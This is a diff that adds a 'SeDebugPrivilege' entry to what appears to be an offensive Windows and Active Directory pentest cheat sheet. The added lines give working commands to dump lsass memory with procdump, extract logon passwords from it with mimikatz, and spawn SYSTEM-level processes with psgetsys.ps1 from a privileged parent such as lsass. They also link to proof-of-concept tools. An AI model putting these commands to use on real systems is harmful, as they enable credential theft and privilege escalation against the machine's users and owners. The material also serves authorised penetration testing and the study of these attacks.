@@ -2468,6 +2468,18 @@ PS C:\> Get-SQLQuery -Verbose -Instance "<IP address>,1433" -username "<domain>\
 $ raiseChild.py -target-exec <IP address> <domain>/<username>
 ```
 
+- SeDebugPrivilege
+
+```
+C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+https://github.com/decoder-it/psgetsystem
+PS C:\> .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,"<command_to_execute>","")
+PS C:\> .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id,"<command_to_execute>","")
+https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC
+```
+
 #6. - Persistence
 -----------------------------------------
 
